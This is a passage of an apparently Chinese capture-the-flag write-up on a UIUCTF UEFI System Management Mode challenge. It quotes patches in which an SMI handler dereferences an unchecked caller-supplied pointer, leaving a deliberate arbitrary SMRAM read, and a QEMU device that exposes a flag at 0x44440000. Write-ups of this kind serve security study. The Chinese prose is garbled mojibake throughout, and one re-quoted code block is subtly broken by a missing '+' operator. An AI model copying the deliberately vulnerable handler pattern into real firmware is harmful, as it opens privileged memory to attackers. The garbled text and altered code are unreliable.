class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; sizeof(CHAR16 *))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Cowsay(*(CONST CHAR16 **)CommBuffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°é¦–å…ˆå¯¹ CommBuffer å’Œ CommBufferSize è¿›è¡Œäº†æ£€æµ‹ï¼Œå¦‚æœæ²¡æœ‰é—®é¢˜å°±æ‰§è¡Œ Cowsayã€‚è¿™æ ·çœ‹è§è¿™é‡Œå­˜åœ¨ä¸€ä¸ªäºŒçº§æŒ‡é’ˆï¼Œå¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°æˆ‘ä»¬ä¸Šé¢æè¿‡çš„ Arbitrary SMRAM Corruption æ¼æ´ï¼Œæˆ‘ä»¬å…ˆè®°ä½è¿™ä¸ªåœ°æ–¹ã€‚</p><p>æ¥ä¸‹æ¥çœ‹ 0004-Add-UEFI-Binexec.patch æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿è¡Œ run.sh çš„æ—¶å€™ä¼šå‡ºç° binexecï¼Œæˆ‘ä»¬ä¸éš¾çŒœåˆ°è¿™ä¸ªæ–‡ä»¶å°±æ˜¯ç”¨äºå’Œè¿›è¡Œç”¨æˆ·äº¤äº’ã€‚<br>æˆ‘ä»¬é‡ç‚¹å…³æ³¨äº¤äº’éƒ¨åˆ†çš„ä»£ç ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+VOID</span></span><br><span class="line"><span class="addition">+Cowsay (</span></span><br><span class="line"><span class="addition">+  IN CONST CHAR16 *Message</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = sizeof(CHAR16 *);</span></span><br><span class="line"><span class="addition">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  FreePool(Buffer);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ“ä½œå¤§æ¦‚å°±æ˜¯ç”³è¯·ä¸€ä¸ª Bufferï¼Œç„¶åè®¾ç½®ä»–çš„å‚æ•°ï¼Œæœ€åè°ƒç”¨ mSmmCommunication-&gt;Communicateã€‚<br>è¿™é‡Œ mSmmCommunication å¯¹è±¡æ˜¯ä¸€ä¸ª EFI_SMM_COMMUNICATION_PROTOCOL ç±»å‹çš„ç»“æ„ä½“ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SmmCommunicationCommunicate</span> (</span><br><span class="line">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span><br><span class="line">  IN OUT VOID                              *CommBuffer,</span><br><span class="line">  IN OUT UINTN                             *CommSize OPTIONAL</span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p>SmmCommunicationCommunicate ç”¨äºåœ¨ SMM æ¨¡å¼ä¸‹è¿›è¡Œé€šä¿¡ã€‚å› ä¸ºæˆ‘ä»¬å®é™…è¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯åœ¨ UEFI å¼•å¯¼ç¯å¢ƒä¸‹æ‰§è¡Œçš„ç‹¬ç«‹åº”ç”¨ç¨‹åºï¼Œä½†ä¸æ˜¯åœ¨ SMM ç¯å¢ƒä¸‹æ‰§è¡Œï¼Œæˆ‘ä»¬æ²¡æ³•ç›´æ¥å’Œ SMM å†…è¿è¡Œçš„ SmmCowsay é©±åŠ¨äº¤äº’ï¼Œåªèƒ½é€šè¿‡ SmmCommunicationCommunicate å‡½æ•°ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦æ³¨æ„è¿™ä¸ªå‡½æ•°çš„å‚æ•°å°±å¯ä»¥çŸ¥é“é€šä¿¡çš„å†…å®¹äº†ã€‚æ­¤å‡½æ•°å°†æ¶ˆæ¯å¤åˆ¶åˆ°å…¨å±€å˜é‡ä¸­ï¼Œå¹¶è§¦å‘è½¯ä»¶ SMI æ¥å¤„ç†è¯¥æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯åŒ…å«æˆ‘ä»¬è¦ä¸ä¹‹é€šä¿¡çš„ SMM å¤„ç†ç¨‹åºçš„ GUIDï¼Œåœ¨è¿›å…¥ SMM æ—¶ä¼šåœ¨å·²æ³¨å†Œå¤„ç†ç¨‹åºçš„é“¾æ¥åˆ—è¡¨ä¸­æœç´¢è¯¥ GUIDã€‚<br>SmmCommunicationCommunicate å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å¯¹åº”æ˜¯çš„ä»£ç ä¸­çš„ Buffer å¯¹è±¡ï¼Œæ˜¯ EFI_SMM_COMMUNICATE_HEADER ç»“æ„ä½“ç±»å‹ã€‚  </p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ qemu çš„ patchï¼Œå­˜åœ¨ä¸€ä¸ªå…¨å±€çš„ç±»ä¼¼äº flag çš„ char å­—ç¬¦æ•°ç»„ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static char nice_try_msg[] = &quot;uiuctf&#123;nice try!!!!!!!!!!!!&#125;\n&quot;;</span></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°è°ƒç”¨äº†è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°æ–¹ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static MemTxResult uiuctfmmio_region4_read_with_attrs(</span></span><br><span class="line"><span class="addition">+    void *opaque, hwaddr addr, uint64_t *val, unsigned size, MemTxAttrs attrs)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    if (!attrs.secure)</span></span><br><span class="line"><span class="addition">+        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);</span></span><br><span class="line"><span class="addition">+    else</span></span><br><span class="line"><span class="addition">+        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);</span></span><br><span class="line"><span class="addition">+    return MEMTX_OK;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+static const MemoryRegionOps uiuctfmmio_region4_io_ops =</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    .write = uiuctfmmio_write,</span></span><br><span class="line"><span class="addition">+    .read_with_attrs = uiuctfmmio_region4_read_with_attrs,</span></span><br><span class="line"><span class="addition">+    .valid.min_access_size = 1,</span></span><br><span class="line"><span class="addition">+    .valid.max_access_size = 8,</span></span><br><span class="line"><span class="addition">+    .endianness = DEVICE_NATIVE_ENDIAN,</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨ uiuctfmmio_region4_read_with_attrs å‡½æ•°æ—¶å¦‚æœ attrs.secure çš„å€¼ä¸º true æ—¶ï¼Œå°±ä¼šèµ°å…¥ region4_msgï¼Œå¦åˆ™èµ°å…¥ nice_try_msgã€‚æˆ‘ä»¬å¯ä»¥è®¤ä¸ºéœ€è¦åœ¨å®‰å…¨çš„ç¯å¢ƒä¸‹è°ƒç”¨è¯¥å‡½æ•°ä¹Ÿå°±æ˜¯åœ¨ SMBASE çš„ç¯å¢ƒä¸­è°ƒç”¨æ‰ä¼šè¿›å…¥åˆ° region4_msgã€‚  </p><p>æ¥ä¸‹æ¥çœ‹çœ‹ flag ç›¸å…³å‡½æ•°ï¼š</p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static void uiuctfmmio_realize(DeviceState *d, Error **errp)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    SysBusDevice *dev = SYS_BUS_DEVICE(d); </span></span><br><span class="line"><span class="addition">+    UiuctfmmioState *sio = UIUCTFMMIO(d);</span></span><br><span class="line"><span class="addition">+    Object *obj = OBJECT(sio);</span></span><br><span class="line"><span class="addition">+    MemoryRegion *sysbus = sysbus_address_space(dev);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    memory_region_init_io(&amp;sio-&gt;region4, obj, &amp;uiuctfmmio_region4_io_ops, sio,</span></span><br><span class="line"><span class="addition">+                          TYPE_UIUCTFMMIO, 0x1000);</span></span><br><span class="line"><span class="addition">+    sysbus_init_mmio(dev, &amp;sio-&gt;region4);</span></span><br><span class="line"><span class="addition">+    memory_region_add_subregion(sysbus, 0x44440000, &amp;sio-&gt;region4);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>ç»™ä»£ç åŠ ç‚¹æ³¨é‡Šï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">uiuctfmmio_realize</span><span class="params">(DeviceState *d, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    SysBusDevice *dev = SYS_BUS_DEVICE(d); <span class="comment">// å°†DeviceStateæŒ‡é’ˆè½¬æ¢ä¸ºSysBusDeviceæŒ‡é’ˆï¼Œä»¥ä¾¿å¯ä»¥è®¿é—®ç³»ç»Ÿæ€»çº¿çš„ç›¸å…³å‡½æ•°ã€‚</span></span><br><span class="line">    UiuctfmmioState *sio = UIUCTFMMIO(d);   <span class="comment">// é€šè¿‡UIUCTFMMIOå®è·å–è®¾å¤‡ç‰¹å®šçš„çŠ¶æ€ç»“æ„æŒ‡é’ˆã€‚</span></span><br><span class="line">    Object *obj = OBJECT(sio);             <span class="comment">// å°†è®¾å¤‡çŠ¶æ€ç»“æ„æŒ‡é’ˆè½¬æ¢ä¸ºObjectæŒ‡é’ˆï¼ŒObjectæ˜¯QEMUä¸­è¡¨ç¤ºå¯¹è±¡çš„é€šç”¨ç»“æ„ã€‚</span></span><br><span class="line">    MemoryRegion *sysbus = sysbus_address_space(dev); <span class="comment">// è·å–ç³»ç»Ÿæ€»çº¿çš„åœ°å€ç©ºé—´ï¼Œè¿™æ˜¯ä¸€ä¸ªMemoryRegionæŒ‡é’ˆï¼Œç”¨äºç®¡ç†å†…å­˜åŒºåŸŸã€‚</span></span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;sio-&gt;region4, obj, &amp;uiuctfmmio_region4_io_ops, sio, <span class="comment">// åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„MemoryRegionï¼Œç”¨äºI/Oæ“ä½œã€‚</span></span><br><span class="line">                          TYPE_UIUCTFMMIO, <span class="number">0x1000</span>); <span class="comment">// æŒ‡å®šå†…å­˜åŒºåŸŸçš„å¤§å°ä¸º0x1000å­—èŠ‚ï¼Œå¹¶å…³è”uiuctfmmio_region4_io_opsæ“ä½œå‡½æ•°å’Œè®¾å¤‡çŠ¶æ€ç»“æ„ã€‚</span></span><br><span class="line">    sysbus_init_mmio(dev, &amp;sio-&gt;region4); <span class="comment">// å°†åˆå§‹åŒ–çš„å†…å­˜åŒºåŸŸæ³¨å†Œåˆ°ç³»ç»Ÿæ€»çº¿ä¸Šï¼Œä½¿å…¶å¯ä»¥å¤„ç†å†…å­˜æ˜ å°„I/Oã€‚</span></span><br><span class="line">    memory_region_add_subregion(sysbus, <span class="number">0x44440000</span>, &amp;sio-&gt;region4); <span class="comment">// å°†å†…å­˜åŒºåŸŸæ·»åŠ åˆ°ç³»ç»Ÿæ€»çº¿çš„åœ°å€ç©ºé—´ä¸­ï¼Œä»åœ°å€0x44440000å¼€å§‹ï¼Œè¿™æ ·å½“æ¨¡æ‹Ÿçš„CPUè®¿é—®è¿™ä¸ªåœ°å€æ—¶ï¼Œä¼šè§¦å‘ç›¸åº”çš„I/Oæ“ä½œå‡½æ•°ã€‚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªè™šæ‹Ÿè®¾å¤‡çš„åˆå§‹åŒ–å‡½æ•°ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªå†…å­˜æ˜ å°„ I&#x2F;O åŒºåŸŸï¼Œå¹¶å°†å…¶æ˜ å°„åˆ°ç³»ç»Ÿæ€»çº¿çš„ç‰¹å®šåœ°å€èŒƒå›´ï¼Œä»¥ä¾¿åœ¨æ¨¡æ‹Ÿç¯å¢ƒä¸­å¯ä»¥æ¨¡æ‹Ÿå¯¹è¿™ä¸ªç¡¬ä»¶è®¾å¤‡çš„è®¿é—®ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬çš„ flag å°±åœ¨ 0x44440000 è¿™ä¸ªç‰©ç†åœ°å€ä¸Šã€‚  </p><p>å›é¡¾ä¸€ä¸‹å¼€å¤´ï¼Œå¼€å¤´çš„ System Tableåœ°å€æ˜¯é¢˜ç›®ç›´æ¥ç»™æˆ‘ä»¬çš„ã€‚EFI System Table é‡Œé¢æœ‰å‡ ä¹æ‰€æœ‰æˆ‘ä»¬éœ€è¦çš„UEFIé©±åŠ¨çš„ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡è¿™ä¸ª Table å¯»å€åˆ°å¾ˆå¤š api æ–¹æ³•å’Œé…ç½®å˜é‡ã€‚  </p><p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹æ¼æ´ç‚¹ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">Cowsay</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST CHAR16 *Message</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line"></span><br><span class="line">  Buffer = <span class="built_in">AllocateRuntimeZeroPool</span>(<span class="built_in">sizeof</span>(*Buffer)  <span class="built_in">sizeof</span>(CHAR16 *));</span><br><span class="line">  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">  Buffer-&gt;MessageLength = <span class="built_in">sizeof</span>(CHAR16 *);</span><br><span class="line">  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line"></span><br><span class="line">  mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">    mSmmCommunication,</span><br><span class="line">    Buffer,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FreePool</span>(Buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢åˆ†æè¿‡ï¼Œæ­¤å¤„çš„ communicate æ˜¯ UEFI åº”ç”¨ç¨‹åº (binexec) å’Œé©±åŠ¨ä¹‹é—´é€šä¿¡çš„æ¡¥æ¢ã€‚ä¼ å…¥çš„ Buffer çš„ç»“æ„æ˜¯ EFI_SMM_COMMUNICATE_HEADERï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Allows for disambiguation of the message format.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EFI_GUID  HeaderGuid;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Describes the size of Data (in bytes) and does not include the size of the header.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINTN     MessageLength;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Designates an array of bytes that is MessageLength in size.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINT8     Data[<span class="number">1</span>];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°è¿™ä¸€æ®µä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼ ç»™dataæˆå‘˜çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆ Messageã€‚  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; sizeof(CHAR16 *))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Cowsay(*(CONST CHAR16 **)CommBuffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>ä¹‹å‰å·²ç»æ³¨å†Œäº†çš„ smi çš„å¤„ç†å‡½æ•°ï¼ŒCommBuffer å³å¯¹åº”ç€æˆ‘ä»¬ä¼ å…¥çš„ Message çš„ dataã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œ CommBuffer å¹¶æ²¡æœ‰åšä»»ä½•æ£€æµ‹å°±ç»™ Cowsay å‡½æ•°ç»™è°ƒç”¨ï¼Œè€Œ Cowsay å‡½æ•°å°±ç±»ä¼¼äºä¸€ä¸ªåé—¨æ‰“å°å‡º *CommBuffer æ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éš¾æƒ³åˆ°å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ ä¼ å…¥çš„ CommBuffer å¹¶æ§åˆ¶ *CommBuffer ä¸º flag çš„åœ°å€ï¼Œç¨‹åºå°±èƒ½ç›´æ¥æ‰“å°å‡º flagã€‚é‚£ç°åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬è¦æ§åˆ¶ CommBuffer å‘¢ï¼Œæ›´é‡è¦çš„æ˜¯æˆ‘ä»¬è¦å¦‚ä½•è°ƒç”¨ SmmCowsayHandlerã€‚é€šè¿‡å‰é¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“è°ƒç”¨ SmmCowsayHandler ç­‰äºæˆ‘ä»¬è¦è°ƒç”¨ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">  mSmmCommunication,</span><br><span class="line">  Buffer,</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ‰¾åˆ° mSmmCommunication</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;<span class="built_in">LocateProtocol</span>(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾ gpt å¸®å¿™è§£é‡Šäº†ä¸€ä¸‹:)  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ®µä»£ç æ˜¯ç”¨æ¥æŸ¥æ‰¾å¹¶è·å–ä¸€ä¸ªåè®®çš„æ¥å£æŒ‡é’ˆã€‚å…·ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç çš„åŠŸèƒ½å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">gBS æ˜¯æŒ‡å‘Boot Servicesçš„æŒ‡é’ˆï¼Œå®ƒæä¾›äº†UEFIå¯åŠ¨æœåŠ¡ä¸­çš„ä¸€ç³»åˆ—å‡½æ•°ã€‚</span><br><span class="line">LocateProtocol æ˜¯Boot Servicesä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾æŒ‡å®šçš„åè®®ã€‚</span><br><span class="line">ä¸‹é¢æ˜¯å¯¹LocateProtocolå‡½æ•°å‚æ•°çš„è¯¦ç»†è§£é‡Šï¼š</span><br><span class="line"></span><br><span class="line">&amp;gEfiSmmCommunicationProtocolGuidï¼šè¿™æ˜¯ä¸€ä¸ªæŒ‡å‘åè®®GUIDï¼ˆå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ï¼‰çš„æŒ‡é’ˆã€‚gEfiSmmCommunicationProtocolGuidæ˜¯è¿™ä¸ªåè®®çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå®ƒç”¨äºæŒ‡å®šè¦æŸ¥æ‰¾çš„åè®®ç±»å‹ã€‚åœ¨è¿™é‡Œï¼Œå®ƒæŒ‡çš„æ˜¯EFI SMMé€šä¿¡åè®®ï¼Œè¿™ä¸ªåè®®ç”¨äºåœ¨ç³»ç»Ÿç®¡ç†æ¨¡å¼ï¼ˆSMMï¼‰å’Œæ­£å¸¸æ‰§è¡Œæ¨¡å¼ä¹‹é—´ä¼ é€’æ¶ˆæ¯ã€‚</span><br><span class="line">NULLï¼šè¿™ä¸ªå‚æ•°æ˜¯åè®®æ¥å£çš„çˆ¶å¥æŸ„ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œå¦‚æœä¸éœ€è¦ç‰¹å®šçš„çˆ¶å¥æŸ„ï¼Œå¯ä»¥ä¼ é€’NULLã€‚</span><br><span class="line">(VOID **)&amp;mSmmCommunicationï¼šè¿™æ˜¯ä¸€ä¸ªè¾“å‡ºå‚æ•°ï¼ŒæŒ‡å‘ä¸€ä¸ªæŒ‡é’ˆçš„åœ°å€ï¼Œè¯¥æŒ‡é’ˆåœ¨å‡½æ•°æˆåŠŸæ‰§è¡Œåå°†è¢«è®¾ç½®ä¸ºæŒ‡å‘æ‰¾åˆ°çš„åè®®æ¥å£ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœLocateProtocolæˆåŠŸæ‰¾åˆ°EFI SMMé€šä¿¡åè®®ï¼ŒmSmmCommunicationå°†åŒ…å«æŒ‡å‘è¯¥åè®®å®ä¾‹çš„æŒ‡é’ˆã€‚</span><br><span class="line"></span><br><span class="line">ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ®µä»£ç 